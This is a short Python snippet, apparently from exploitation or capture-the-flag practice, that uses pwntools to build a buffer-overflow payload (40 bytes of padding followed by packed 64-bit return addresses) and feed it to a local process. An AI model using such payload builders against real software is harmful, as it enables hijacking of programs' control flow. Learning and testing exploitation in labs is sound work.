import pwn

def chain(addrs, off=40):
    return 'a' * off + ''.join(map(pwn.util.packing.p64, addrs))

def runchain(exe, ch):
    proc = pwn.process(exe)
    proc.sendline(ch)
    return proc.recvall()
